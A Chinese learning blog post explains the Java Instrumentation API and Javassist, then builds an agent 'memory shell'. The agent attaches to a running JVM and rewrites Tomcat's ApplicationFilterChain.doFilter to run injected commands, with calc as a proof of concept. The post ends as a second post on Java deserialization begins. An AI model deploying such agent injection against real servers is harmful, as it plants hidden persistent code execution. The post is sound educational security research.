<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Instrumentation</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span>;</span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span>;</span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span>;</span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class\[\] getAllLoadedClasses();</span><br><span class="line">    ......&#125;</span><br></pre></td></tr></table></figure>

<h5 id="getAllloadedClasses和isModifiableClass"><a href="#getAllloadedClasses和isModifiableClass" class="headerlink" title="getAllloadedClasses和isModifiableClass"></a>getAllloadedClasses和isModifiableClass</h5><p>修改agentmain,在其中添加<code>getAllloadedClasses</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, Instrumentation instrumentation)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Class[] classes=instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span>(Class aclass: classes)&#123;</span><br><span class="line">            System.out.println(aclass.getName()+<span class="string">&quot;\tModifiable==&gt;&quot;</span>+(instrumentation.isModifiableClass(aclass)?<span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426165933108.png" alt="image-20220426165933108"></p>
<h5 id="addTransformer-和retransformClasses"><a href="#addTransformer-和retransformClasses" class="headerlink" title="addTransformer()和retransformClasses()"></a>addTransformer()和retransformClasses()</h5><p>在addTransformer()中的参数<code>ClassFileTransformer transformer</code>可以帮助我们完成修改字节码的工作</p>
<p>这是一个接口,提供了一个<code>transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">byte</span>\[\]</span><br><span class="line">    transform(  ClassLoader         loader,</span><br><span class="line">                String              className,</span><br><span class="line">                Class&lt;?&gt;            classBeingRedefined,</span><br><span class="line">                ProtectionDomain    protectionDomain,</span><br><span class="line">                <span class="keyword">byte</span>\[\]              classfileBuffer) &#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="comment">/*使用Instrumentation.addTransformer()来加载一个转换器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">转换器的返回结果（transform()方法的返回值）将成为转换后的字节码。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">对于没有加载的类，会使用ClassLoader.defineClass()定义它；对于已经加载的类，会使用ClassLoader.redefineClasses()重新定义，并配合Instrumentation.retransformClasses进行转换。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>现在有了修改Class字节码的方法,还缺少一个工具<code>javassist</code></p>
<h4 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h4><blockquote>
<p>Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件。</p>
<p>我们常用到的动态特性主要是反射，在运行时查找对象属性、方法，修改作用域，通过方法名称调用方法等。在线的应用不会频繁使用反射，因为反射的性能开销较大。其实还有一种和反射一样强大的特性，但是开销却很低，它就是Javassit。</p>
<p>与其他类似的字节码编辑器不同, Javassist 提供了两个级别的 API: 源级别和字节码级别。 如果用户使用源级 API, 他们可以编辑类文件, 而不知道 Java 字节码的规格。 整个 API 只用 Java 语言的词汇来设计。 您甚至可以以源文本的形式指定插入的字节码; Javassist 在运行中编译它。 另一方面, 字节码级 API 允许用户直接编辑类文件作为其他编辑器。</p>
</blockquote>
<h5 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h5><p>这个类是javassist的核心组件之一</p>
<p>简单来说，这就是个容器，存放的是<code>CtClass</code>对象。</p>
<p>获得方法： ClassPool cp = ClassPool.getDefault();。通过 ClassPool.getDefault() 获取的 ClassPool 使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径。</strong></p>
<p><code>cp.insertClassPath(new ClassClassPath(&lt;Class&gt;));</code></p>
<h5 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h5><p>可以把它理解成加强版的Class对象,需要从ClassPool中获得</p>
<p>获得方法<code>CtClass cc=cp.get(ClassName)</code></p>
<h5 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h5><p>可以理解为加强版的Method对象</p>
<p>获得方法:<code>CtMethod m=cc.getDeclaredMethod(MethodName)</code></p>
<p>这个类提供了一些方法,让我们可以很方便的修改方法体</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CtMethod</span> <span class="keyword">extends</span> <span class="title">CtBehavior</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中&#125;// 父类 CtBehaviorpublic abstract class CtBehavior extends CtMember &#123;</span></span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBody</span><span class="params">(String src)</span></span>;</span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertBefore</span><span class="params">(String src)</span></span>;</span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertAfter</span><span class="params">(String src)</span></span>;</span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">insertAt</span><span class="params">(<span class="keyword">int</span> lineNum, String src)</span></span>;&#125;</span><br></pre></td></tr></table></figure>

<p>传递给方法 <code>insertBefore()</code> ，<code>insertAfter()</code> 和 <code>insertAt()</code> 的 String 对象<strong>是由<code>Javassist</code> 的编译器编译的</strong>。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：</p>
<table>
<thead>
<tr>
<th align="left">符号</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0, $1, $2, …</td>
<td align="left">$0 = this; $1 = args[1] …..(也就是$0代表this,$1..这些代表当前方法的参数)</td>
</tr>
<tr>
<td align="left">$args</td>
<td align="left">方法参数数组.它的类型为 Object[]</td>
</tr>
<tr>
<td align="left">$$</td>
<td align="left">所有实参。例如, m($$) 等价于 m($1,$2,…)</td>
</tr>
<tr>
<td align="left">$cflow(…)</td>
<td align="left">cflow 变量</td>
</tr>
<tr>
<td align="left">$r</td>
<td align="left">返回结果的类型，用于强制类型转换</td>
</tr>
<tr>
<td align="left">$w</td>
<td align="left">包装器类型，用于强制类型转换</td>
</tr>
<tr>
<td align="left">$_</td>
<td align="left">返回值</td>
</tr>
</tbody></table>
<p>一个简单的agent例子</p>
<h4 id="agent-jar"><a href="#agent-jar" class="headerlink" title="agent.jar"></a>agent.jar</h4><p>首先看agent.jar包内的代码</p>
<h5 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: AgentDemo</span><br><span class="line">Can-Redefine-Classes: <span class="keyword">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="keyword">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="TransformerDemo-java"><a href="#TransformerDemo-java" class="headerlink" title="TransformerDemo.java"></a>TransformerDemo.java</h5><p><code>ClassFileTransformer</code>实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformerDemo</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String targetClassName;</span><br><span class="line">    <span class="keyword">public</span> String targetMethodName ;</span><br><span class="line">    <span class="keyword">public</span> String targetVMClassName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TransformerDemo</span><span class="params">(String targetClassName, String targetMethodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.targetClassName = targetClassName;</span><br><span class="line">        <span class="keyword">this</span>.targetMethodName = targetMethodName;</span><br><span class="line">        <span class="keyword">this</span>.targetVMClassName = <span class="keyword">new</span> String(targetClassName).replaceAll(<span class="string">&quot;\\.&quot;</span>,<span class="string">&quot;\\/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException  &#123;</span><br><span class="line">        <span class="keyword">if</span>(!className.equals(targetVMClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;not do transform&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;do transform&quot;</span>);</span><br><span class="line">            ClassPool cp = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">            CtClass ctc = cp.get(<span class="keyword">this</span>.targetClassName);</span><br><span class="line">            System.out.println(ctc.getName());</span><br><span class="line">            CtMethod method = ctc.getDeclaredMethod(<span class="keyword">this</span>.targetMethodName);</span><br><span class="line">            System.out.println(method.getName());</span><br><span class="line">            String source = <span class="string">&quot;&#123;System.out.println(\&quot;hello transformer\&quot;);&#125;&quot;</span>;</span><br><span class="line">            method.setBody(source);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = ctc.toBytecode();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="AgentDemo-java"><a href="#AgentDemo-java" class="headerlink" title="AgentDemo.java"></a>AgentDemo.java</h5><p>agentmain方法实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String className = <span class="string">&quot;com.test.Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String methodName = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agentmain启动!!&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> TransformerDemo(className, methodName), <span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//这个参数一定要写true,否则new出来的transformer不能修改类</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;Class&gt; needRetransformClasses = <span class="keyword">new</span> LinkedList&lt;Class&gt;();</span><br><span class="line">            Class[] loadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">            <span class="keyword">for</span> (Class c : loadedClasses) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(className)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;找到要修改的类了!!!&quot;</span>);</span><br><span class="line">                    Method[] methods = c.getDeclaredMethods();</span><br><span class="line">                    <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">                        System.out.println(method.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    inst.retransformClasses(c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后按照之前打包的方法打包成jar包</p>
<p>接下来是测试类代码</p>
<h5 id="Hello-java"><a href="#Hello-java" class="headerlink" title="Hello.java"></a>Hello.java</h5><p>这个类中的hello方法是要修改的目标方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;hello world!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Hello h1 = <span class="keyword">new</span> Hello();</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            h1.hello();</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="HelloWorld-java"><a href="#HelloWorld-java" class="headerlink" title="HelloWorld.java"></a>HelloWorld.java</h5><p>这个类是连接虚拟机启动javaagent的类</p>
<p>我在里面写了个循环遍历list,这样就不用等Hello运行之后再<code>jps -l</code>方法去寻找对应的pid了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptors = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;virtualMachineDescriptors.size();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(virtualMachineDescriptors.get(i).displayName().contains(<span class="string">&quot;Hello&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    String id=virtualMachineDescriptors.get(i).id();</span><br><span class="line">                    <span class="comment">//连接虚拟机</span></span><br><span class="line">                    VirtualMachine vm=VirtualMachine.attach(id);</span><br><span class="line">                    <span class="comment">//提供代理jar包路径</span></span><br><span class="line">                    vm.loadAgent(<span class="string">&quot;H:\\java\\rubbish\\agent\\out\\artifacts\\agent_jar\\agent.jar&quot;</span>);</span><br><span class="line">                    vm.detach();</span><br><span class="line">                    System.out.println(<span class="string">&quot;ends----&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220426220901529.png" alt="image-20220426220901529"></p>
<h4 id="Agent内存马"><a href="#Agent内存马" class="headerlink" title="Agent内存马"></a>Agent内存马</h4><p>在实验过程中,出现了一个让我摸不着头脑的错误</p>
<p>经过多次尝试和su18大佬的指导,确定了问题所在</p>
<p>首先解决了昨天不能调试的问题</p>
<p>在tomcat项目(比如springMVC)的lib中引入agent.jar,然后就可以看到对应的class文件,在对应的class文件中下断点即可</p>
<p>但是无法得知getDefault方法的结果</p>
<p>使用idea的evaluate expression来运行得到报错信息,是类未找到,也就是说,没有找到对应的.calss文件,解决了好久,尝试了自己写类加载器,但是还是失败了</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220427143235362.png" alt="image-20220427143235362" style="zoom: 67%;" />



<p>最后参考了<a href="https://github.com/rebeyond/memShell">rebeyond</a>大佬的做法,将javassist.jar解压后的到的jvassist文件夹放到agent的代码同级目录一起打包成agent.jar</p>
<blockquote>
<p>打包之前,需要先删除已有的artifacts,否则会把这个javassist继续打包成jar,只需要按照最上面的设置重新整一个artifacts就行了</p>
</blockquote>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220429105814605.png" alt="image-20220429105814605"></p>
<p>这样完美解决了找不到类的问题</p>
<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><p>连接虚拟机启动的代码并没有变化,主要的变化在agent中</p>
<p>MANIFEST.MF文件没有变化</p>
<h5 id="AgentDemo"><a href="#AgentDemo" class="headerlink" title="AgentDemo"></a>AgentDemo</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String className = <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String methodName = <span class="string">&quot;doFilter&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;agentmain启动!!&quot;</span>);</span><br><span class="line">        Class[] loadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Class c : loadedClasses) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c.getName().equals(className)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;找到要修改的类了!!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    inst.addTransformer(<span class="keyword">new</span> TransformerDemo(className, methodName), <span class="keyword">true</span>);</span><br><span class="line">                    inst.retransformClasses(c);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="TransformerDemo"><a href="#TransformerDemo" class="headerlink" title="TransformerDemo"></a>TransformerDemo</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformerDemo</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String targetClassName;</span><br><span class="line">    <span class="keyword">public</span> String targetMethodName;</span><br><span class="line">    <span class="keyword">public</span> String targetVMClassName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TransformerDemo</span><span class="params">(String targetClassName, String targetMethodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.targetClassName = targetClassName;</span><br><span class="line">        <span class="keyword">this</span>.targetMethodName = targetMethodName;</span><br><span class="line">        <span class="keyword">this</span>.targetVMClassName = <span class="keyword">new</span> String(targetClassName).replaceAll(<span class="string">&quot;\\.&quot;</span>, <span class="string">&quot;\\/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readTXT</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(path), <span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">            StringBuffer bf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            String line = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                bf.append(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            br.close();</span><br><span class="line">            <span class="keyword">return</span> bf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!className.equals(targetVMClassName)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                    System.out.println(<span class="string">&quot;do transform&quot;</span>);</span><br><span class="line">                    ClassPool cp=ClassPool.getDefault();</span><br><span class="line">                    <span class="keyword">if</span> (classBeingRedefined != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">//添加新的路径</span></span><br><span class="line">                        ClassClassPath ccp = <span class="keyword">new</span> ClassClassPath(classBeingRedefined);</span><br><span class="line">                        cp.insertClassPath(ccp);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(<span class="string">&quot;获取到ClassPool&quot;</span>);</span><br><span class="line">                    CtClass ctc = cp.get(<span class="keyword">this</span>.targetClassName);</span><br><span class="line">                    System.out.println(ctc.getName());</span><br><span class="line">                    CtMethod method = ctc.getDeclaredMethod(<span class="keyword">this</span>.targetMethodName);</span><br><span class="line">                    System.out.println(method.getName());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    String source = readTXT(<span class="string">&quot;C:\\Users\\yuand\\Desktop\\data2.txt&quot;</span>);</span><br><span class="line">                    source=<span class="string">&quot;try &#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;            Runtime.getRuntime().exec(\&quot;calc\&quot;);\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        &#125; catch (java.io.IOException e) &#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;            e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">                    System.out.println(<span class="string">&quot;执行插入代码方法&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    method.insertBefore(source);</span><br><span class="line">                    <span class="keyword">byte</span>[] bytes = ctc.toBytecode();</span><br><span class="line">                    ctc.detach();</span><br><span class="line">                    <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>插入代码这里通过txt文件读取的代码总是因为格式原因报错,直接写的打开计算器的代码可以正常插入并执行</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220429110139169.png" alt="image-20220429110139169"></p>
<p>对于txt文件内代码格式问题还需要再稍微研究一下</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>javaAgent</tag>
        <tag>memshell</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化学习</title>
    <url>/2022/03/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h3><h5 id="反序列化特征"><a href="#反序列化特征" class="headerlink" title="反序列化特征"></a>反序列化特征<span id="more"></span></h5><p>下方的特征可以作为序列化的标志参考:</p>
<ul>
<li>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。</li>
<li>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</li>
</ul>
<p>Java序列化是指把java对象转换为字节序列的过程,而java反序列化是指把字节序列恢复为java对象的过程</p>
<p>序列化分将数据分解成字节流,以便存储在文件中或在网络上传输,反序列化就是打开字节流并重构对象,对象序列化不仅要将基本数据类型转换成字节表示,有时还要恢复数据,恢复数据要求有恢复数据的对象实例</p>
<p>应用场景:</p>
<p>1.想把内存中的对象保存到一个文件中或者数据库中的时候</p>
<p>2.想用套接字在网络上传送对象的时候</p>
<p>3.想通过RMI传输对象的时候</p>
<p>java现在有很多种不同的序列化方式,先从原生的开始</p>
<h4 id="java原生序列化"><a href="#java原生序列化" class="headerlink" title="java原生序列化"></a>java原生序列化</h4><p>先通过简单的代码来了解java反序列化的流程</p>
